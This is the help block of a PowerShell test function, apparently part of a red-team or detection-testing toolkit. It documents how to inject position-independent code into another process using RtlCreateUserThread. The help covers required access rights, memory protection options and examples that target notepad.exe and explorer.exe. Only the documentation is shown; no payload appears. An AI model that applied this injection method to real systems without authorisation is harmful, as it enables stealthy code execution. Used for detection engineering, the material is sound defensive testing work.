function Invoke-ATHInjectedThread {
<#
.SYNOPSIS

Test runner for "Portable Executable" process injection.

Technique ID: T1055.002 (Process Injection: Portable Executable Injection)

.DESCRIPTION

Invoke-ATHInjectedThread injects position-independent code into a target process using the RtlCreateUserThread API. Despite the naming of the "Portable Executable Injection" technique, injection of a Portable Executable (PE) file is not necessary to conduct this technique. When Portable Executable are injected using this technique, they are built in a position-independent fashion that have a PE self-loading capability.

Invoke-ATHInjectedThread is designed to only inject into 64-bit processes.

.PARAMETER ProcessId

Specifies the process ID of the target process that Invoke-ATHInjectedThread will inject into. If -ProcessId is not specified, Invoke-ATHInjectedThread will launch a notepad.exe process that it will inject code into.

.PARAMETER ProcessAccessType

Specifies the access rights to request of the target process in order to perform injection. Possible values are MinimumAccess and AllAccess. MinimumAccess requests the minimum set of access rights required to perform injection: PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_QUERY_INFORMATION. AllAccess requests PROCESS_ALL_ACCESS for the target process. If -ProcessAccessType is not specified, MinimumAccess is used as the default value.

.PARAMETER MemoryProtectionType

Specifies the memory protection type of the injected code at time of execution. Possible values are ReadWriteExecute and ReadExecute. If -MemoryProtectionType is not specified, ReadWriteExecute is used as a default value. ReadWriteExecute is the most flexible option that would permit the execution of self-modifying position-independent code. ReadExecute is ideal when self-modifying code is not needed and the minimum set of permissions necessary to execute is desired.

.PARAMETER PositionIndependentCodeBytes

Specifies user-supplied position-independent code to inject into the target process. If -PositionIndependentCodeBytes is not specified, default template code will be used. The default template code is useful for confirming that the injected code executed successfully.

.PARAMETER TestGuid

Optionally, specify a test GUID value to use to override the generated test GUID behavior.

.INPUTS

System.Diagnostics.Process

Invoke-ATHInjectedThread accepts the output of Get-Process. Only one Process object should be supplied to Invoke-ATHInjectedThread.

Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process

Invoke-ATHInjectedThread accepts the output of a Win32_Process WMI object via Get-CimInstance.

.OUTPUTS

PSObject

Outputs an object consisting of relevant execution details. The following object properties may be populated:

* TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
* TestSuccess - Will be set to True if it was determined that the technique executed successfully. Invoke-ATHInjectedThread can only confidently determine success when user-supplied position-independent code is not supplied via -PositionIndependentCodeBytes - i.e. the built-in template code is used.
* TestGuid - Specifies the test GUID that was used for the test.
* InjectedCodeBytes - Specifies a byte array consisting of the raw bytes that were injected into the target process.
* InjectedCodeHash - SHA256 hash of the bytes injected into the target process.
* SourceProcessId - Specifies the process ID of the process that performed the injection - i.e. the current PowerShell process.
* SourceExecutablePath - Specifies the executable path of the process that performed the injection - i.e. the current PowerShell process.
* SourceCommandLine - Specifies the command-line of the process that performed the injection - i.e. the current PowerShell process.
* TargetProcessId - Specifies the process ID of the process that Invoke-ATHInjectedThread injects into.
* TargetExecutablePath - Specifies the executable path of the process that Invoke-ATHInjectedThread injects into.
* TargetCommandLine - Specifies the command-line of the process that Invoke-ATHInjectedThread injects into.
* TargetProcessAccess - Specifies the process access rights requested of the target process.
* TargetProcessAccessValue - Specifies the process access rights requested of the target process as a decimal value.
* TargetBaseAddressHex - Specifies the base address of the memory that Invoke-ATHInjectedThread allocates in the target process.
* TargetAllocationPageProtect - Specifies the memory page protection of the position-independent code in the target process at time of execution. Possible values are PAGE_EXECUTE_READ and PAGE_EXECUTE_READWRITE.
* TargetAllocationPageProtectValue - Specifies the memory page protection of the position-independent code in the target process at time of execution as a decimal value.
* TargetThreadId - Specifies the thread ID of the new thread that Invoke-ATHInjectedThread creates in the target process.
* TargetChildProcessId - Specifies the process ID of the powershell.exe process that spawned as the result of the template position-independent code successfully executing. This property will only be populated by Invoke-ATHInjectedThread when an argument is supplied to -PositionIndependentCodeBytes by a user.
* TargetChildProcessCommandLine - Specifies the command-line of the powershell.exe process that spawned as the result of the template position-independent code successfully executing. This property will only be populated by Invoke-ATHInjectedThread when an argument is supplied to -PositionIndependentCodeBytes by a user.

.EXAMPLE

Invoke-ATHInjectedThread

Injects template code into a spawned notepad.exe process.

.EXAMPLE

Get-Process explorer | Invoke-ATHInjectedThread

Injects template code into explorer.exe.

.EXAMPLE

Invoke-ATHInjectedThread -PositionIndependentCodeBytes @(0x90, 0x90, 0x90, 0xC3)

Injects user-supplied position-independent code into a spawned notepad.exe process.

.EXAMPLE

Get-Process explorer | Invoke-ATHInjectedThread -PositionIndependentCodeBytes @(0x90, 0x90, 0x90, 0xC3)

Injects user-supplied position-independent code into explorer.exe.

.EXAMPLE

Invoke-ATHInjectedThread -ProcessAccessType AllAccess

Specifies PROCESS_ALL_ACCESS access to a spawned notepad.exe process that it injects template code into.

.EXAMPLE

Invoke-ATHInjectedThread -MemoryProtectionType ReadExecute

Executes injected code from a PAGE_EXECUTE_READ page instead of using default PAGE_EXECUTE_READWRITE permissions.
